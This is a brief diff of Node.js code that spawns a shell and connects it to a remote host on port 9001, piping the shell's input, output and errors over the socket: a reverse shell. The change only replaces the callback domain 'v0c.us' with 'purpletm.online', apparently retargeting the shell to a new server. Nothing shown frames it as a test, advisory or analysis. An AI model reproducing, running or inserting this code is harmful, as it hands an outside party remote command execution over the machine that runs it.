@@ -3,7 +3,7 @@
         cp = require("child_process"),
         sh = cp.spawn("sh", []);
     var client = new net.Socket();
-    client.connect(9001, "v0c.us", function(){
+    client.connect(9001, "purpletm.online", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
